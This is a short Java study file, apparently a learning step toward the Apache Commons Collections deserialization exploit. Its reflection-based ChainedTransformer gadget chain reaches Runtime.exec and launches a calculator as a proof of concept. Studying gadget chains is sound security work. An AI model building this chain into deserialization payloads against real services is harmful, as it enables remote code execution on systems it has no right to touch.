package payload;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;

public class test2 {
    public static void main(String[] args) throws Exception {

        Transformer[] transformers = new Transformer[]{
                // 传入Runtime类
                new ConstantTransformer(Runtime.class),
                // 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                // invoke()调用Runtime.class.getMethod("getRuntime").invoke(null)
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,new Object[0]}),

                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"gnome-calculator"})
        };
        Transformer chain = new ChainedTransformer(transformers);
        chain.transform(null);


    }
}